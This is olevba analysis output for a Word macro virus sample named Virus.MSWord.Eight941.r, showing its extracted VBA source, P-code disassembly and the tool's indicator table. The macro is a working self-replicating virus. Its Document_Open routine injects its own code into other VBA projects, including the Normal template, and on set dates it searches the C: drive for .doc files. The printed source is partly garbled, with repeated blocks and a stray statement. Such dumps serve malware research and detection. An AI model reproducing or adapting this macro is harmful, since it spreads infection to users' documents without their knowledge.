olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Eight941.r
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Eight941.r - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub Document_Close()
On Error Resume Next
    If Left(Me.BuiltInDocumentProperties("Title"), 1) = "?" Then
        Me.BuiltInDocumentProperties("Title") = Mid(Me.BuiltInDocumentProperties("Title"), 2)
        Exit Sub
    End If
    Me.BuiltInDocumentProperties("Title") = "?" & Me.BuiltInDocumentProperties("Title")
    Dim currdoc As Document
    Dim thecode As Object
On Error Resume Next
    If Left(Me.BuiltInDocumentProperties("Title"), 1) = "?" Then
        Me.BuiltInDocumentProperties("Title") = Mid(Me.BuiltInDocumentProperties("Title"), 2)
        Exit Sub
    End If
    Me.BuiltInDocumentProperties("Title") = "?" & Me.BuiltInDocumentProperties("Title")
    Dim
    Dim thecode As Object
On Error Resume Next
    If Left(Me.BuiltInDocumentProperties("Title"), 1) = "?" Then
        Me.BuiltInDocumentProperties("Title") = Mid(Me.BuiltInDocumentProperties("Title"), 2)
        Exit Sub
    End If
    Me.BuiltInDocumentProperties("Title") = "?" & Me.BuiltInDocumentProperties("Title")
    Dim currdoc As Document
    Dim thecode As Object
On Error Resume Next
    If Left(Me.BuiltInDocumentProperties("Title"), 1) = "?" Then
        Me.BuiltInDocumentProperties("Title") = Mid(Me.BuiltInDocumentProperties("Title"), 2)
        Exit Sub
    End If
    Me.BuiltInDocumentProperties("Title") = "?" & Me.BuiltInDocumentProperties("Title")
    Dim currdoc As Document
    Dim thecode As Object
On Error Resume Next
    If Left(Me.BuiltInDocumentProperties("Title"), 1) = "?" Then
        Me.BuiltInDocumentProperties("Title") = Mid(Me.BuiltInDocumentProperties("Title"), 2)
        Exit Sub
    End If
    Me.BuiltInDocumentProperties("Title") = "?" & Me.BuiltInDocumentProperties("Title")
    Dim currdoc As Document
    Dim thecode As Object
    Dim currcomp As Object


Private Sub Document_Open()
On Error Resume Next
Dim i, j As Integer
j = -1
For i = 1 To Application.VBE.VBProjects.Count
    If Application.VBE.VBProjects(i).Name = "Normal" Then
        j = i
    End If
    If Application.VBE.VBProjects(i).VBComponents(1).CodeModule.Find("Document_Open", 1, 1, 1000, 100) = False Then
        Dim B, l As Integer
            If j > 0 Then
                If Application.VBE.VBProjects(j).VBComponents(1).CodeModule.Find("Document_Open", 1, 1, 1000, 100) = True Then
                    B = Application.VBE.VBProjects(j).VBComponents(1).CodeModule.ProcStartLine("Document_Open", vbext_pk_Proc)
                    l = Application.VBE.VBProjects(j).VBComponents(1).CodeModule.ProcCountLines("Document_Open", vbext_pk_Proc)
                    Application.VBE.VBProjects(i).VBComponents(1).CodeModule.AddFromString Application.VBE.VBProjects(j).VBComponents(1).CodeModule.Lines(B, B + l)
                Else
                    B = Me.VBProject.VBComponents(1).CodeModule.ProcStartLine("Document_Open", vbext_pk_Proc)
                    l = Me.VBProject.VBComponents(1).CodeModule.ProcCountLines("Document_Open", vbext_pk_Proc)
                    Application.VBE.VBProjects(i).VBComponents(1).CodeModule.AddFromString Me.VBProject.VBComponents(1).CodeModule.Lines(B, B + l)
            End If
        End If
    End If
Next i
If (Month(Date) = 11 And Day(Date) = 10) Or (Month(Date) = 7 And Day(Date) = 1) Then
Set fs = Application.FileSearch
    fs.LookIn = "c:\"
    fs.FileName = "*.doc"
    fs.SearchSubFolders = True
    If fs.Execute() > 0 Then
        For i = 1 To fs.FoundFiles.Count
            
            
            Options.AllowFastSave = True
            Options.BackgroundSave = True
            Options.CreateBackup = False
            Options.SavePropertiesPrompt = False
            Options.SaveNormalPrompt = False
Exitub:
               Next i
    End If
End If
End Sub














































































-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Eight941.r
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 7003 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Private Sub Document_Close())
' Line #2:
' 	OnError (Resume Next) 
' Line #3:
' 	LitStr 0x0005 "Title"
' 	Ld id_FFFF 
' 	ArgsMemLd BuiltInDocumentProperties 0x0001 
' 	LitDI2 0x0001 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0001 "?"
' 	Eq 
' 	IfBlock 
' Line #4:
' 	LitStr 0x0005 "Title"
' 	Ld id_FFFF 
' 	ArgsMemLd BuiltInDocumentProperties 0x0001 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0002 
' 	LitStr 0x0005 "Title"
' 	Ld id_FFFF 
' 	ArgsMemSt BuiltInDocumentProperties 0x0001 
' Line #5:
' 	ExitSub 
' Line #6:
' 	EndIfBlock 
' Line #7:
' 	LitStr 0x0001 "?"
' 	LitStr 0x0005 "Title"
' 	Ld id_FFFF 
' 	ArgsMemLd BuiltInDocumentProperties 0x0001 
' 	Concat 
' 	LitStr 0x0005 "Title"
' 	Ld id_FFFF 
' 	ArgsMemSt BuiltInDocumentProperties 0x0001 
' Line #8:
' 	Dim 
' 	VarDefn currdoc (As Document)
' Line #9:
' 	Dim 
' 	VarDefn thecode (As Object)
' Line #10:
' 	OnError (Resume Next) 
' Line #11:
' 	LitStr 0x0005 "Title"
' 	Ld id_FFFF 
' 	ArgsMemLd BuiltInDocumentProperties 0x0001 
' 	LitDI2 0x0001 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0001 "?"
' 	Eq 
' 	IfBlock 
' Line #12:
' 	LitStr 0x0005 "Title"
' 	Ld id_FFFF 
' 	ArgsMemLd BuiltInDocumentProperties 0x0001 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0002 
' 	LitStr 0x0005 "Title"
' 	Ld id_FFFF 
' 	ArgsMemSt BuiltInDocumentProperties 0x0001 
' Line #13:
' 	ExitSub 
' Line #14:
' 	EndIfBlock 
' Line #15:
' 	LitStr 0x0001 "?"
' 	LitStr 0x0005 "Title"
' 	Ld id_FFFF 
' 	ArgsMemLd BuiltInDocumentProperties 0x0001 
' 	Concat 
' 	LitStr 0x0005 "Title"
' 	Ld id_FFFF 
' 	ArgsMemSt BuiltInDocumentProperties 0x0001 
' Line #16:
' 	Reparse 0x0007 "    Dim"
' Line #17:
' 	Dim 
' 	VarDefn thecode (As Object)
' Line #18:
' 	OnError (Resume Next) 
' Line #19:
' 	LitStr 0x0005 "Title"
' 	Ld id_FFFF 
' 	ArgsMemLd BuiltInDocumentProperties 0x0001 
' 	LitDI2 0x0001 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0001 "?"
' 	Eq 
' 	IfBlock 
' Line #20:
' 	LitStr 0x0005 "Title"
' 	Ld id_FFFF 
' 	ArgsMemLd BuiltInDocumentProperties 0x0001 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0002 
' 	LitStr 0x0005 "Title"
' 	Ld id_FFFF 
' 	ArgsMemSt BuiltInDocumentProperties 0x0001 
' Line #21:
' 	ExitSub 
' Line #22:
' 	EndIfBlock 
' Line #23:
' 	LitStr 0x0001 "?"
' 	LitStr 0x0005 "Title"
' 	Ld id_FFFF 
' 	ArgsMemLd BuiltInDocumentProperties 0x0001 
' 	Concat 
' 	LitStr 0x0005 "Title"
' 	Ld id_FFFF 
' 	ArgsMemSt BuiltInDocumentProperties 0x0001 
' Line #24:
' 	Dim 
' 	VarDefn currdoc (As Document)
' Line #25:
' 	Dim 
' 	VarDefn thecode (As Object)
' Line #26:
' 	OnError (Resume Next) 
' Line #27:
' 	LitStr 0x0005 "Title"
' 	Ld id_FFFF 
' 	ArgsMemLd BuiltInDocumentProperties 0x0001 
' 	LitDI2 0x0001 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0001 "?"
' 	Eq 
' 	IfBlock 
' Line #28:
' 	LitStr 0x0005 "Title"
' 	Ld id_FFFF 
' 	ArgsMemLd BuiltInDocumentProperties 0x0001 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0002 
' 	LitStr 0x0005 "Title"
' 	Ld id_FFFF 
' 	ArgsMemSt BuiltInDocumentProperties 0x0001 
' Line #29:
' 	ExitSub 
' Line #30:
' 	EndIfBlock 
' Line #31:
' 	LitStr 0x0001 "?"
' 	LitStr 0x0005 "Title"
' 	Ld id_FFFF 
' 	ArgsMemLd BuiltInDocumentProperties 0x0001 
' 	Concat 
' 	LitStr 0x0005 "Title"
' 	Ld id_FFFF 
' 	ArgsMemSt BuiltInDocumentProperties 0x0001 
' Line #32:
' 	Dim 
' 	VarDefn currdoc (As Document)
' Line #33:
' 	Dim 
' 	VarDefn thecode (As Object)
' Line #34:
' 	OnError (Resume Next) 
' Line #35:
' 	LitStr 0x0005 "Title"
' 	Ld id_FFFF 
' 	ArgsMemLd BuiltInDocumentProperties 0x0001 
' 	LitDI2 0x0001 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0001 "?"
' 	Eq 
' 	IfBlock 
' Line #36:
' 	LitStr 0x0005 "Title"
' 	Ld id_FFFF 
' 	ArgsMemLd BuiltInDocumentProperties 0x0001 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0002 
' 	LitStr 0x0005 "Title"
' 	Ld id_FFFF 
' 	ArgsMemSt BuiltInDocumentProperties 0x0001 
' Line #37:
' 	ExitSub 
' Line #38:
' 	EndIfBlock 
' Line #39:
' 	LitStr 0x0001 "?"
' 	LitStr 0x0005 "Title"
' 	Ld id_FFFF 
' 	ArgsMemLd BuiltInDocumentProperties 0x0001 
' 	Concat 
' 	LitStr 0x0005 "Title"
' 	Ld id_FFFF 
' 	ArgsMemSt BuiltInDocumentProperties 0x0001 
' Line #40:
' 	Dim 
' 	VarDefn currdoc (As Document)
' Line #41:
' 	Dim 
' 	VarDefn thecode (As Object)
' Line #42:
' 	Dim 
' 	VarDefn currcomp (As Object)
' Line #43:
' Line #44:
' Line #45:
' 	FuncDefn (Private Sub Document_Open())
' Line #46:
' 	OnError (Resume Next) 
' Line #47:
' 	Dim 
' 	VarDefn i
' 	VarDefn j (As Integer)
' Line #48:
' 	LitDI2 0x0001 
' 	UMi 
' 	St j 
' Line #49:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd VBProjects 
' 	MemLd Count 
' 	For 
' Line #50:
' 	Ld i 
' 	Ld Application 
' 	MemLd VBE 
' 	ArgsMemLd VBProjects 0x0001 
' 	MemLd New 
' 	LitStr 0x0006 "Normal"
' 	Eq 
' 	IfBlock 
' Line #51:
' 	Ld i 
' 	St j 
' Line #52:
' 	EndIfBlock 
' Line #53:
' 	LitStr 0x000D "Document_Open"
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x03E8 
' 	LitDI2 0x0064 
' 	LitDI2 0x0001 
' 	Ld i 
' 	Ld Application 
' 	MemLd VBE 
' 	ArgsMemLd VBProjects 0x0001 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #54:
' 	Dim 
' 	VarDefn B
' 	VarDefn l (As Integer)
' Line #55:
' 	Ld j 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #56:
' 	LitStr 0x000D "Document_Open"
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x03E8 
' 	LitDI2 0x0064 
' 	LitDI2 0x0001 
' 	Ld j 
' 	Ld Application 
' 	MemLd VBE 
' 	ArgsMemLd VBProjects 0x0001 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #57:
' 	LitStr 0x000D "Document_Open"
' 	Ld vbext_pk_Proc 
' 	LitDI2 0x0001 
' 	Ld j 
' 	Ld Application 
' 	MemLd VBE 
' 	ArgsMemLd VBProjects 0x0001 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd ProcStartLine 0x0002 
' 	St B 
' Line #58:
' 	LitStr 0x000D "Document_Open"
' 	Ld vbext_pk_Proc 
' 	LitDI2 0x0001 
' 	Ld j 
' 	Ld Application 
' 	MemLd VBE 
' 	ArgsMemLd VBProjects 0x0001 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd ProcCountLines 0x0002 
' 	St l 
' Line #59:
' 	Ld B 
' 	Ld B 
' 	Ld l 
' 	Add 
' 	LitDI2 0x0001 
' 	Ld j 
' 	Ld Application 
' 	MemLd VBE 
' 	ArgsMemLd VBProjects 0x0001 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0001 
' 	Ld i 
' 	Ld Application 
' 	MemLd VBE 
' 	ArgsMemLd VBProjects 0x0001 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #60:
' 	ElseBlock 
' Line #61:
' 	LitStr 0x000D "Document_Open"
' 	Ld vbext_pk_Proc 
' 	LitDI2 0x0001 
' 	Ld id_FFFF 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd ProcStartLine 0x0002 
' 	St B 
' Line #62:
' 	LitStr 0x000D "Document_Open"
' 	Ld vbext_pk_Proc 
' 	LitDI2 0x0001 
' 	Ld id_FFFF 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd ProcCountLines 0x0002 
' 	St l 
' Line #63:
' 	Ld B 
' 	Ld B 
' 	Ld l 
' 	Add 
' 	LitDI2 0x0001 
' 	Ld id_FFFF 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0001 
' 	Ld i 
' 	Ld Application 
' 	MemLd VBE 
' 	ArgsMemLd VBProjects 0x0001 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #64:
' 	EndIfBlock 
' Line #65:
' 	EndIfBlock 
' Line #66:
' 	EndIfBlock 
' Line #67:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #68:
' 	Ld Date 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x000B 
' 	Eq 
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000A 
' 	Eq 
' 	And 
' 	Paren 
' 	Ld Date 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0007 
' 	Eq 
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	And 
' 	Paren 
' 	Or 
' 	IfBlock 
' Line #69:
' 	SetStmt 
' 	Ld Application 
' 	MemLd FileSearch 
' 	Set fs 
' Line #70:
' 	LitStr 0x0003 "c:\"
' 	Ld fs 
' 	MemSt LookIn 
' Line #71:
' 	LitStr 0x0005 "*.doc"
' 	Ld fs 
' 	MemSt FileName 
' Line #72:
' 	LitVarSpecial (True)
' 	Ld fs 
' 	MemSt SearchSubFolders 
' Line #73:
' 	Ld fs 
' 	ArgsMemLd Execute 0x0000 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #74:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld fs 
' 	MemLd FoundFiles 
' 	MemLd Count 
' 	For 
' Line #75:
' Line #76:
' Line #77:
' 	LitVarSpecial (True)
' 	Ld Options 
' 	MemSt AllowFastSave 
' Line #78:
' 	LitVarSpecial (True)
' 	Ld Options 
' 	MemSt BackgroundSave 
' Line #79:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt CreateBackup 
' Line #80:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SavePropertiesPrompt 
' Line #81:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #82:
' 	Label Exitub 
' Line #83:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #84:
' 	EndIfBlock 
' Line #85:
' 	EndIfBlock 
' Line #86:
' 	EndSub 
' Line #87:
' Line #88:
' Line #89:
' Line #90:
' Line #91:
' Line #92:
' Line #93:
' Line #94:
' Line #95:
' Line #96:
' Line #97:
' Line #98:
' Line #99:
' Line #100:
' Line #101:
' Line #102:
' Line #103:
' Line #104:
' Line #105:
' Line #106:
' Line #107:
' Line #108:
' Line #109:
' Line #110:
' Line #111:
' Line #112:
' Line #113:
' Line #114:
' Line #115:
' Line #116:
' Line #117:
' Line #118:
' Line #119:
' Line #120:
' Line #121:
' Line #122:
' Line #123:
' Line #124:
' Line #125:
' Line #126:
' Line #127:
' Line #128:
' Line #129:
' Line #130:
' Line #131:
' Line #132:
' Line #133:
' Line #134:
' Line #135:
' Line #136:
' Line #137:
' Line #138:
' Line #139:
' Line #140:
' Line #141:
' Line #142:
' Line #143:
' Line #144:
' Line #145:
' Line #146:
' Line #147:
' Line #148:
' Line #149:
' Line #150:
' Line #151:
' Line #152:
' Line #153:
' Line #154:
' Line #155:
' Line #156:
' Line #157:
' Line #158:
' Line #159:
' Line #160:
' Line #161:
' Line #162:
' Line #163:
' Line #164:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

